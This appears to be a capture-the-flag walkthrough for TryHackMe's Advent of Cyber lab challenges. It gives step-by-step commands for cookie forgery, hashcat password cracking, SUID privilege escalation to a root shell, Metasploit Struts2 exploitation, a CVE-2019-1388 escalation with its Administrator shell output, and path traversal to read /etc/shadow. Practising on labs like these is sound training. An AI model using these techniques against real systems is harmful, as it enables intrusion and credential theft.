# Advent of Cyber

## Day 1 : Inventory Management 
#### 1.	What is the name of the cookie used for authentication?
	
	Go to the <machine IP:3000> and register yourself then refresh the page
	Press CTRL + SHIFT + I to access the Developer Consoloe
	Go to Applications tab and click on Cookies 

	auth<redacted>

#### 2.	If you decode the cookie, what is the value of the fixed part of the cookie?
	
	Access the cookie and decode the value which is encoded in base64(%3D is '=')
	Your username is the first part and second part will be same for everybody

	v4er9<redacted>

#### 3. After accessing his account, what did the user 'mcinventory' request?
	
	user = mcinventory
	we know the second part of cookie
	encode 'mcinventoryv4er9111!ss' into base64(you can search online for tools)
	bWNpbnZlbnRvcnl2NGVyOWxsMSFzcw%3D%3D
	copy and paste it into the value and press enter and refresh

	fire<redacted>

##  Day 2 : Arctic Forum 
#### 1.	What is the path of the hidden page?

	Recommended tool is DirSearch but we will use gobuster
	we will use the the recommended wordlist
	run 'gobuster -u http://<machine IP>:3000 -w /path/to/wordlist'

	/Sys<redacted>

#### 2.	What is the password you found?
	
	goto http://<machine IP>:3000/sysadmin
	check the page source
	"Admin Portal Created by Arctic Digital Design - check out github repo"
	google it 


    username: admin
    password: <redacted>word

#### 3.	What do you have to take to the 'partay'

	goto http://<machine IP>:3000/sysadmin
	login with default credentials
	You will see a note
	Hey all - Please don't forget to BYOE(Bring Your Own <redacted>) for the partay!!

	Egg<redacted>

## Day 3 : Evil Elf
#### 1.	Whats the destination IP on packet number 998?
	Download the embeded file (Evil Elf.pcap)
	Open it with Wireshark
	Move to Packet No. 998 

	63.32.<redacted>

#### 2.	What item is on the Christmas list?

	filter by telnet and click on Packet No. 2255

	ps<redacted>


#### 3.	Crack buddy's password!
	filter by telnet and click in Packet No. 2908
	Copy the hash its SHA-512
	paste just the hash
	Use hashcat to crack 
	hashcat -a 0 -m 1800 john.hash /usr/share/wordlists/rockyou.txt --force

	rain<redacted>

## Day 4 : Training 

	username: mcsysadmin
	password: bestelf1234

#### 1.	How many visible files are there in the home directory(excluding ./ and ../)?

	<redacted>	

#### 2.	What is the content of file5?
	
	reci<redacted>

#### 3.	Which file contains the string ‘password’?

	grep -l -e "password" -f *
	
	<redacted>

#### 4. What is the IP address in a file in the home folder?
	
	cat * | grep -Eo "([0-9]{1,3}[\.]){3}[0-9]{1,3}"
	
	10.<redacted>.5

#### 5. How many users can log into the machine?

	<redacted>

#### 6. What is the sha1 hash of file8?
	
	sha1sum file8
	
	<redacted>

#### 7. What is mcsysadmin’s password hash?

	search for bak files using locate shadow | grep bak , (find / -type f -name *.bak)
	
	<redacted>

## Day 5 : Ho-Ho-Hosint
#### 1. What is Lola's date of birth? Format: Month Date, Year(e.g November 12, 2019)
	
	use exiftools to see metadata and search creator name in twitter
	
	<redacted>
	
#### 2. What is Lola's current occupation?

	In twitter 
	
	December<redacted>,1900

#### 3. What phone does Lola make?
	
	Go through posts in twitter 
	
	<redacted> X

#### 4. What date did Lola first start her photography? Format: dd/mm/yyyy

	Go WayBackMachine and put the lola's website and navigate to the earliest date 
	here we see earliest date is October 23, 2019 navigate to it
	
	23/<redacted>

#### 5. What famous woman does Lola have on her web page?

	go to her webpage that you found in her twitter accound
	Download the ladies photo and use reverse image search using google
	
	ada <redacted>

## Day 6 : Data Elf-iltration 
#### 1. What data was exfiltrated via DNS?
	
	open file in wireshark and apply dns filter
	Spot which packet is querying a hex string subdomain of the holidaythief.com domain. 
	You can decode hex into ascii by echo hex string | xxd -r -p
	
	Candy Cane <redacted>

#### 2. What did Little Timmy want to be for Christmas?
	
	download the packet which is quering google.com
	extract hidden info from 'TryHackMe.jpg' using steghide extract -sf <path>
	subheading of is what we looking for
	
	<redacted>

#### 3. What was hidden within the file?
	
	crack the zip file using fcrackzip (download it using apt-get install fcrackzip)
	Enter the password (december) and concatenate Timmy file
	
	RFC <redacted>

## Day 7 : Skilling Up

	nmap -sC -sV -O <machine-ip>

#### 1. how many TCP ports under 1000 are open?

	<redacted>

#### 2. What is the name of the OS of the host?

	<redacted>ux

#### 3. What version of SSH is running?

	<redacted>.4

#### 4. What is the name of the file that is accessible on the server you found running?

	check web server running on port 999
	<redacted>.file

## Day 8 : SUID Shenanigans

	Username: holly
	Password: <redacted>

#### 1. What port is SSH running on?

	<redacted>34

#### 2. Find and run a file as igor. Read the file /home/igor/flag1.txt
	
	find / -user igor -perm -4000 -exec ls -ldb {} \;
	we see that find command is owned by igor but we can also run
	touch foo
	find foo -exec cat /home/igor/flag1.txt \;

	<redacted>

#### 3. Find another binary file that has the SUID bit set. Using this file, can you become the root user and read the /root/flag2.txt file?
	
	find / -user igor -perm -4000 -exec ls -ldb {} \;
	in most cases, you have to go throgh all binaries or look for suspicious one which in this case is system-control
	run it and it ask for user input to run a command if we run whoami it returns root we can use to cat our flag2 or spawn a root shell by giving it /bin/bash as input

	<redacted>

#### 4. If you've finished the challenge and want more practise, checkout the Privilege Escalation Playground room created by SherlockSec: https://tryhackme.com/room/privescplayground
	
	No answer needed

## Day 9 : Requests
#### 1. What is the value of the flag?
	
	sCrIP<redacted>

## Day 10 : Metasploit-a-ho-ho-ho

	exploit(multi/http/struts2_content_type_ognl) > set TARGETURI showcase.action

#### 1. Compromise the web server using Metasploit. What is flag1?
	
	find / 2>>/dev/null | grep -i "flag"
	<redacted>

#### 2. Now you've compromised the web server, get onto the main system. What is Santa's SSH password?
	
	santa:<redacted>

#### 3. Who is on line 148 of the naughty list?
	
	sed '52!d' nice_list.txt 
	<redacted>

#### 4. Who is on line 52 of the nice list?
	
	sed '148!d' naughty_list.txt
	<redacted>

## Day 11 : Elf Applications 
#### 1 	What is the password inside the creds.txt file?

	<redacted>

#### 2. What is the name of the file running on port 21?

	file<redacted>

#### 3. What is the password after enumerating the database?
	
	best<redacted>

## Day 12 : Elfcryption

#### 1. What is the md5 hashsum of the encrypted note1 file?

	md5sum file

	<redacted>

#### 2. Where was elf Bob told to meet Alice?

	gpg -d file and enter the password (25daysofchristmas)

	<redacted>

#### 3. Decrypt note2 and obtain the flag!

	openssl rsa -in private.key -pubout -out public.key and enter the password (hello)
	openssl rsautl -decrypt -inkey private.key -in encrypted_file -out decrypted.txt

	<redacted>

## Day 13 : Accumulate

#### 1. A web server is running on the target. What is the hidden directory which the website lives on?
	nmap -sC -sV -Pn -oN nmap_day13.txt machine-ip
```bash
gobuster dir -u http://10.10.237.165/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 35
```
```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.237.165/
[+] Threads:        35
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/06/21 03:36:27 Starting gobuster
===============================================================
/????? (Status: 301)
Progress: 12292 / 220561 (5.57%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/06/21 03:38:01 Finished
===============================================================
```

> /r????

#### 2. Gain initial access and read the contents of user.txt
	After visiting the directory we found a username `wade` and a blog
```
Contents of blog:
I can’t believe the movie based on my favorite book of all time is going to come out in a few days! Maybe it’s because my name is so similar to the main character, but I honestly feel a deep connection to the main character Wade. I keep mistyping the name of his avatar whenever I log in but I think I’ll eventually get it down. Either way, I’m really excited to see this movie! 
```
After checking the comments of of the post i was able to get the password of the user
After logging in you will see the user flag on desktop

> THM{HACK_??????????}


#### 3. [Optional] Elevate privileges and read the content of root.txt

We will also see a executable named hhupd.exe on the desktop lets research on it
After searching i was able to get the vulnerabilty that will escalate our privileges to root/Administrator

[Github link to exploit we will use](https://github.com/jas502n/CVE-2019-1388)

After successful exploitataion, you will get a command prompt with Administrator privileges

```
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\System32>powershell -ep bypass
Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Users> cd .\Administrator
PS C:\Users\Administrator> cd .\Desktop
PS C:\Users\Administrator\Desktop> ls

    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/23/2020  10:34 AM             31 root.txt


PS C:\Users\Administrator\Desktop> type root.txt
THM{COIN????????????????????}
PS C:\Users\Administrator\Desktop>
```

## Unknown Storage

#### What is the name of the file you found?

You can use check the bucket by simply browsing

```bash
firefox http://advent-bucket-one.s3.amazonaws.com/
```
```
Contents of webpage:
<ListBucketResult>
<Name>advent-bucket-one</Name>
<Prefix/>
<Marker/>
<MaxKeys>1000</MaxKeys>
<IsTruncated>false</IsTruncated>
<Contents>
<Key>employee??????.txt</Key>
<LastModified>2019-12-14T15:53:25.000Z</LastModified>
<ETag>"e8d2d18588378e0ee0b27fa1b125ad58"</ETag>
<Size>7</Size>
<StorageClass>STANDARD</StorageClass>
</Contents>
</ListBucketResult>
```
> employee_??????


#### What is in the file?

We can also simply check the whats inside the file by browsing to it
```bash
firefox http://advent-bucket-one.s3.amazonaws.com/employee_??????
```

> mc?????

## LFI

#### What is Charlie going to book a holiday to?

> check the website to answer the question (Haw???)

#### Read /etc/shadow and crack Charlies password.
	
	use burpsuite to manipulate the request and change the header (GET /get-file/%2fetc%2fshadow HTTP/1.1)
	and crack the hash and login to machine using ssh

#### What is flag1.txt?
	
	THM{4ea2adf84????????????????}

## File Confusion



#### How many files did you extract(excluding all the .zip files)?

> ?0

#### How many files contain Version: 1.1 in their metadata?

> ?

#### Which file contains the password?

> ????.txt



